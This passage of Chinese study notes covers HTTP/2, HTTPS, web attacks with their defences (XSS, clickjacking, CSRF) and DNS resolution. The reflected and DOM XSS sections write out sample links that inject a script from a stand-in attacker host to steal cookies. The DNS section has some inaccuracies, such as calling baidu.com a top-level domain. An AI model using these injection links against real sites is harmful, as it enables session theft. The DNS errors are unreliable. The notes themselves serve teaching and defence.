>**HTTP2.0多路复用有多好**？HTTP 性能优化的关键并不在于高带宽，而是**低延迟**。TCP 连接会随着时间进行自我「调谐」，起初会限制连接的最大速度，如果数据成功传输，会随着时间的推移提高传输的速度。这种调谐则被称为 TCP 慢启动。由于这种原因，让原本就具有突发性和短时性的 HTTP 连接变的十分低效。HTTP/2 通过让所有数据流共用同一个连接，可以更有效地使用 TCP 连接，让高带宽也能真正的服务于 HTTP 的性能提升。

3. `header压缩`，如上文中所言，对前面提到过`HTTP1.x`的header带有大量信息，而且每次都要重复发送，`HTTP2.0`使用`encoder`来减少需要传输的header大小，通讯双方各自cache一份`header fields`表，既避免了重复header的传输，又减小了需要传输的大小。
>**为什么需要头部压缩**？假定一个页面有100个资源需要加载（这个数量对于今天的Web而言还是挺保守的）, 而每一次请求都有1kb的消息头（这同样也并不少见，因为Cookie和引用等东西的存在）, 则至少需要多消耗100kb来获取这些消息头。HTTP2.0可以维护一个字典，差量更新HTTP头部，大大降低因头部传输产生的流量。

4. `服务端推送（server push）`，同SPDY一样，HTTP2.0也具有server push功能。服务端推送能把客户端所需要的资源伴随着index.html一起发送到客户端，省去了客户端重复请求的步骤。正因为没有发起请求，建立连接等操作，所以静态资源通过服务端推送的方式可以极大地提升速度。



## `HTTP`(80 端口) 与 `HTTPS`(443 端口)
`HTTPS`是以安全为目标的`HTTP`通道，简单讲是`HTTP`的安全版，即`HTTP`下加入`SSL(Secure Socekts Layer)`层，`HTTPS`的安全基础是`SSL`，因此加密的详细内容就需要`SSL`。

客户端拿到公钥(放在证书里)，用公钥锁定一个随机值并将随机值传给服务器，服务器用私钥解密(这是使用非对称加密的，更浪费时间)，以后就用这个随机值来传递数据(使用随机值作为对称加密的秘钥加密数据，对称加密要比非对称加密快得多)。

如何确认是真正的服务器的公钥？权威机构颁发证书，操作系统内置了权威机构的公钥(或者后面自行安装的 根证书)，权威机构使用它的秘钥加密服务器的公钥和其他一些信息生成 数字证书，并使用 数字签名的方式对这个下发的证书做校验。客户端确认确实是服务器的公钥之后再使用该公钥非对称加密一个用来后续加密传输数据所用的对称加密的秘钥。

**缺点**：HTTPS 使页面加载时间延长，增加数据开销，经济开销，连接缓存问题。

> 关于如何从 HTTP 升级到 HTTPS 可以查看 [阮一峰——HTTPS 升级指南](http://www.ruanyifeng.com/blog/2016/08/migrate-from-http-to-https.html)。


# 安全
## `XSS`(Cross-site Scripting，跨站脚本攻击)
### 存储型`XSS`攻击
注入的攻击脚本永久存储在数据库，持久化。比如系统没有对用户的输入做过滤，可以插入一段自动发送网站`cookie`的脚本，当其他人打开包含这段信息的页面时就会自动获取隐私信息了，攻击的是多人。

### 反射型`XSS`攻击
非持久化的，需要欺骗用户自己去点击链接才能触发`XSS`代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。比如我们知道服务器会将搜索的关键词直接显示，我们就构造一个`XSS`的链接`(<a href="http://xsstest.qq.com/search.php?q=%3Cscript src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E&commend=all&ssid=s5-e&search_type=item&atype=&filterFineness=&rr=1&pcat=food2011&style=grid&cat=">点击就送998</a>)`，这样就能将该用户的在该网站的`cookie`获取到了。这是针对单人的。

### `DOM`型`XSS`攻击
和反射性非常类似，不过是不需要经过服务器的，比如网站有个脚本是直接获取用户输入的`url`中的某个参数如`content`，那么就可以伪造一个`XSS`的链接`(<a href="http://example.com?content="%3Cscript src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E">)`从而完成 `XSS`攻击，这种攻击也是单人的，只不过服务器设置的 XSS 防御就不起作用了，所以需要 前端同时防范。

## 防御
`XSS`防御的总体思路是：对输入(和 URL 参数)进行过滤，对输出进行编码。这里推荐`OWASP`。

- `HttpOnly`: `Set-Cookie: =[; =][; expires=][; domain=][; path=][; secure][; HttpOnly]`，如果`Cookie`具有`HttpOnly`特性且不能通过客户端脚本访问，则为`true`；否则为`false`。默认值为`false`。

- `过滤`: 对诸如`<script>`、`<img>`、`<a>` 等标签进行过滤。

- `编码`: 像一些常见的符号，如`<、>`在输入的时候要对其进行转换编码。

- `限制`: `XSS`攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。

### `CSP`(Content Security Policy 内容安全策略)
`CSP`的实质就是**白名单制度**，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。
> 查看[`XSS`终结者-CSP 理论与实践](https://github.com/joeyguo/blog/issues/5)

## `Click Jacking`(点击劫持)
点击劫持就是利用透明的`iframe`或者被覆盖的`iframe`，通过诱骗用户在该网页上点击某些按钮，触发`iframe`页面上的点击操作。

### 防御

`X-Frame-Options`响应头。用来给浏览器指示允许一个页面可否在`<frame>, </iframe>`或者 `<object>`中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持的攻击。

## `CSRF`(Cross-site Request Forgery，跨站请求伪造)
![CSRF](http://cdn.valtzhao.com/img/csrf_process.png)

### 防御
`Cookie-to-Header Token`: 表单的数据需要一个`token`，这个`token`通过`cookie`来生成，服务器验证。这样攻击者伪造的请求中`token`不对就认为是一次`CSRF`攻击。

`验证码`: 重要的操作让用户输入验证码，非常安全。但是用户体验差。

`验证HTTP Refer字段`: 验证请求来源，没啥用，可以改。

# 补充部分
## DNS基础和解析
- 根域：就是所谓的“.”，其实我们的网址`www.baidu.com`在配置当中应该是`www.baidu.com.`（最后有一点），一般我们在浏览器里输入时会省略后面的点，而这也已经成为了习惯。 根域服务器我们知道有13台，但是这是错误的观点。 根域服务器只是具有13个`IP`地址，但机器数量却不是13台，因为这些IP地址借助了任播的技术，所以我们可以在全球设立这些IP的镜像站点，你访问到的这个IP并不是唯一的那台主机。 具体的镜像分布可以参考维基百科。这些主机的**内容都是一样的**
- 域的划分：根域下来就是`顶级域`或者叫`一级域`， 有两种划分方式，一种互联网刚兴起时的按照行业性质划分的`com.`，`net.`等，一种是按国家划分的如`cn.`，`jp.`，等。 具体多少你可以自己去查，我们这里不关心。 每个域都会有域名服务器，也叫权威域名服务器。 `Baidu.com`就是一个顶级域名，而`www.baidu.com`却不是顶级域名，他是在`baidu.com` 这个域里的一叫做`www`的主机。 一级域之后还有二级域，三级域，只要我买了一个顶级域，并且我搭建了自己`BIND`服务器（或者其他软件搭建的）注册到互联网中，那么我就可以随意在前面多加几个域了（当然长度是有限制的）。 比如`a.www.baidu.com`，在这个网址中，`www.baidu.com`变成了一个二级域而不是一台主机，主机名是`afrt5`。
- 域名服务器：能提供域名解析的服务器，上面的记录类型可以是`A(address)记录`，`NS记录（name server）`，`MX（mail）`，`CNAME`等。`A记录`是什么意思呢，就是记录一个`IP地址`和一个`主机名字`，比如我这个域名服务器所在的域`test.baidu.com`，我们知道这是一个二级的域名，然后我在里面有一条`A记录`,记录了主机为`a`的`IP`，查到了就返回给你了。 如果我现在要想`baidu.com`这个域名服务器查询`a.test.baidu.com`，那么这个顶级域名服务器就会发现你请求的这个网址在`test.baidu.com`这个域中，我这里记录了这个二级域的域名服务器`test.baidu.com`的`NS`的`IP`。我返回给你这个地址你再去查主机为`a`的主机把。这些域内的域名服务器都称为`权威服务器`，直接提供DNS查询服务。（这些服务器可不会做递归哦）
- 解析过程：
  1. 现在我有一台计算机，通过ISP接入了互联网，那么ISP就会给我分配一个DNS服务器，这个DNS服务器不是权威服务器，而是相当于一个代理的dns解析服务器，他会帮你迭代权威服务器返回的应答，然后把最终查到IP返回给你
  2. 现在的我计算机要向这台ISPDNS发起请求查询`www.baidu.com`这个域名了，(经网友提醒：这里其实准确来说不是ISPDNS，而应该是用户自己电脑网络设置里的DNS，并不一定是ISPDNS。比如也有可能你手工设置了`8.8.8.8`) 
  3. ISPDNS拿到请求后，先检查一下自己的缓存中有没有这个地址，有的话就直接返回。这个时候拿到的ip地址，会被标记为非权威服务器的应答。
  4. 如果缓存中没有的话，ISPDNS会从配置文件里面读取13个根域名服务器的地址（这些地址是不变的，直接在BIND的配置文件中）
  5. 然后向其中一台发起请求
  6. 根服务器拿到这个请求后，知道他是`com.`这个顶级域名下的，所以就会返回`com`域中的NS记录，一般来说是13台主机名和IP
  7. 然后ISPDNS向其中一台再次发起请求，`com`域的服务器发现你这请求是`baidu.com`这个域的，我一查发现了这个域的`NS`，那我就返回给你，你再去查。 （目前百度有4台`baidu.com`的顶级域名服务器）
  8. ISPDNS不厌其烦的再次向`baidu.com`这个域的权威服务器发起请求，`baidu.com`收到之后，查了下有`www`的这台主机，就把这个`IP`返回给你了
  9. 然后ISPDNS拿到了之后，将其返回给了客户端，并且把这个保存在高速缓存中

### 简短总结版
1. 在浏览器中输入`www.qq.com `域名，操作系统会先检查自己本地的`hosts`文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析

2. 如果`hosts`里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析

3. 如果`hosts`与本地DNS解析器缓存都没有相应的网址映射关系，首先会找`TCP/ip`参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性

4. 如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性

5. 如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个`IP`。本地DNS服务器收到IP信息后，将会联系负责`.com`域的这台服务器。这台负责`.com`域的服务器收到请求后，如果自己无法解析，它就会找一个管理`.com`域的下一级DNS服务器地址`(http://qq.com)`给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找`http://qq.com`域服务器，重复上面的动作，进行查询，直至找到`www.qq.com`主机。

6. 如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。

# 参考内容
> [网络基础知识之HTTP协议](https://zhuanlan.zhihu.com/p/24913080)
>
> [HTTP协议详解](https://www.jianshu.com/p/80e25cb1d81a)
>
> [HTTP1.0、HTTP1.1 和 HTTP2.0 的区别](https://juejin.im/entry/5981c5df518825359a2b9476)